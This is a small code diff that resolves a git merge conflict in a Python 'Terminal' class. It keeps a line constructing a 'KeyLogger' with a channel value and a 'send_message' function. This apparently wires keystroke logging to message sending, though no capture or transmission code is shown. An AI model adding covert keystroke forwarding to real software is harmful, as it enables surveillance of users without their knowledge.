@@ -19,11 +19,7 @@ class Terminal:
         
         self.commandHandler = CommandHandler(config, infoClass)
         
-<<<<<<< HEAD
-        self.keyLogger = KeyLogger(infoClass.track_channel_value, infoClass.sendMessage, self.commandHandler)
-=======
         self.keyLogger = KeyLogger(infoClass.track_channel_value, infoClass.send_message)
->>>>>>> c4d2f088005f40a683c0538e6f513bd420849fa7
         
         self.configClass = config
         
